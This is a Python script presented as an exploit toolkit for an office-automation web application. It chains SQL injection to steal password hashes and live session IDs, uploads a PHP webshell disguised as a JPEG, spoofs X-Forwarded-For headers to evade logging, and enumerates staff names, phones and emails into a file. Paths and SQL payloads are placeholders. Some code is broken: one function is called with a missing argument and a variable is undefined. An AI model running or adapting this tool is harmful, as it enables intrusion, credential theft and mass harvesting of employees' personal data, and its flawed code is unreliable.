import re
import time
import string
import random
import base64
import hashlib
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = None
# proxies = { "http": "socks5://127.0.0.1:8080", "https": "socks5://127.0.0.1:8080" }

HELPER_MESSAGE = f"""Example:
python3 {__file__} --url http://127.0.0.1/ --method getinfo
python3 {__file__} --url http://127.0.0.1/ --method sqli --args check/gethash/getsess
python3 {__file__} --url http://127.0.0.1/ --method getshell --args pass username password
python3 {__file__} --url http://127.0.0.1/ --method getshell --args sess 1ku4ekghdd2j818l9kjlpbvgm4
python3 {__file__} --url http://127.0.0.1/ --method getuser --args 1ku4ekghdd2j818l9kjlpbvgm4 (1000)
"""

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
)

HEADERS = {"User-Agent": USER_AGENT, "X-Forwarded-For": "127.0.0.2"}

FILE1 = {"FILE1": ("1.jpg", "<?php $a=xxx;$b=xxx;$a($b);?>", "application/octet-stream")}


def gen_fake_ip():
    chars = string.digits
    arr = []
    for _ in range(4):
        arr.append("".join([random.choice(chars) for _ in range(3)]))
    return ".".join(arr)


def get_random_name():
    chars = string.ascii_lowercase
    return "".join([random.choice(chars) for _ in range(5)])


def get_random_ua():
    # return ua.random
    return USER_AGENT


def gen_headers():
    ua = get_random_ua()
    fakeIP = gen_fake_ip()
    headers = {"User-Agent": ua, "X-Forwarded-For": fakeIP}
    return headers


def get_info(url):
    """
    获取OA版本信息
    """
    url_info = url + "/path/to/version.php"
    headers = gen_headers()
    req = requests.get(url_info, headers=headers, proxies=proxies, verify=False)
    result = re.findall(r"<span .*?>((.|\n)*?)</span>", req.text)
    if "some text" in result:
        print("\n".join(result))
    elif req.status_code == 200:
        print("possible latest version")


def getshell_with_pass(url, args):
    """
    提供用户名密码的postauth RCE
    """
    username = args[1]
    password = args[2] if len(args) > 2 else ""
    shell_name = get_random_name()
    sess = requests.session()
    sess.headers.update(HEADERS)
    sess.post(
        url + "/path/to/password_login.php",
        data={"USERNAME": username.encode("gbk"), "PASSWORD": password.encode("gbk"), "encode_type": "1"},
        proxies=proxies,
        verify=False,
    )
    sess.post(url + f"/path/to/upload.php?shell=/path/to/{shell_name}.php", files=FILE1, proxies=proxies, verify=False)
    shell_url = url + f"/path/to/{shell_name}.php"
    if sess.get(shell_url, proxies=proxies, verify=False).status_code == 200:
        print(f"[+] {shell_url} # assert(base64_decode($_POST['x']))")


def getshell_with_sessid(url, args):
    """
    提供PHPSESSID的postauth RCE
    """
    sessionid = args[1]
    shell_name = get_random_name()
    sess = requests.session()
    sess.headers.update(HEADERS)
    sess.cookies["PHPSESSID"] = sessionid
    sess.post(url + f"/path/to/upload.php?shell=/path/to/{shell_name}.php", files=FILE1, proxies=proxies, verify=False)
    shell_url = url + f"/path/to/{shell_name}.php"
    if sess.get(shell_url, proxies=proxies, verify=False).status_code == 200:
        print(f"[+] {shell_url} # assert(base64_decode($_POST['x']))")


def check_sqli(url):
    """
    检查是否存在SQL注入漏洞（无攻击流量）
    """
    url1 = url + "/path/to/sqli.php"
    headers = gen_headers()
    req = requests.get(url1, headers=headers, proxies=proxies, verify=False)
    res = re.findall(r"some pattern here", req.text)
    if len(res) and res[0] == "1337":
        return True
    else:
        return False


def do_sqli_query(url, payload):
    """
    执行SQL注入payload并返回结果
    """
    sqli_url = url + f"/path/to/sqli.php"
    data = dict()
    data["payload"] = payload
    headers = gen_headers()
    resp = requests.post(sqli_url, headers=headers, data=data, proxies=proxies, verify=False)
    return resp.json().get("data")


def get_user_hash(url):
    """
    利用SQLi从数据库中获得用户密码md5 hash
    """
    if check_sqli(url):
        for _ in range(100):
            get_hash_payload = "sqli payload here"
            user_hash = do_sqli_query(get_hash_payload)
            if user_hash:
                print(f"[+] {user_hash}")
    else:
        print("[-] Not vulnerable")


def get_online_sess(url):
    """
    利用SQLi从数据库中获得在线用户session
    """
    if check_sqli(url):
        count_payload = "sqli payload here"
        online_user_count = int(do_sqli_query(count_payload))
        if online_user_count > 0:
            for i in range(online_user_count):
                session_payload = "sqli payload here"
                online_user_session = do_sqli_query(session_payload)
                if online_user_session:
                    print(f"[+] {online_user_session}")
        else:
            print("[-] No user online.")
    else:
        print("[-] Not vulnerable")


def get_all_users(url, args):
    """
    登录后通过遍历获取企业用户信息
    """
    sessid = args[0]
    limit = int(args[1]) if len(args) > 2 else 2337
    base_url = url
    for userid in range(1337, limit):
        try:
            url = f"{base_url}/path/to/staffinfo.php?userid={userid}"
            headers = gen_headers()
            req = requests.session()
            req.headers.update(headers)
            req.cookies["PHPSESSID"] = sessid
            r = req.get(url, verify=False, proxies=proxies).json()
            result_list = [r.get("name"), r.get("telephone"), r.get("department"), r.get("role"), r.get("email")]
            result = " ".join(result_list)
            print(result)
            if department == "离职/外部人员":
                continue
            with open("user-all.txt", "a") as f:
                f.write(result + "\n")
        except Exception as e:
            print(e)
            time.sleep(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="sample_oa_exp",
        description="Sample OA exploit toolkit, from SQL injection to webshell persistence, with disable_functions bypassed",
        epilog=HELPER_MESSAGE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--url", metavar="http://example.com/", type=str, nargs="?", help="the target url", dest="url", required=True
    )
    parser.add_argument(
        "--method",
        dest="method",
        metavar="getinfo",
        type=str,
        nargs="?",
        help="the exploit method: getinfo, sqli, getshell, getuser",
        required=True,
    )
    parser.add_argument("--args", dest="args", nargs="*", type=str, metavar="", help="the exploit method's arguments")
    args = parser.parse_args()
    url = args.url
    method = args.method
    method_args = args.args
    if method not in ["getinfo", "getshell", "sqli", "getuser"]:
        parser.print_help()
        exit()
    try:
        if method == "getinfo":
            get_info(url)
        elif method == "getshell" and len(method_args):
            if method_args[0] == "pass":
                getshell_with_pass(url, method_args)
            elif method_args[0] == "sess":
                getshell_with_sessid(url, method_args)
        elif method == "sqli":
            if method_args[0] == "gethash":
                get_user_hash(url)
            elif method_args[0] == "getsess":
                get_online_sess(url)
            elif method_args[0] == "check":
                if check_sqli(url):
                    print("[+] Vulnerable")
                else:
                    print("[-] Not vulnerable")
        elif method == "getuser":
            get_all_users(url, method_args)
        else:
            parser.print_help()
            exit()
    except Exception as e:
        print("Something error: {}, maybe not vulnerable".format(e))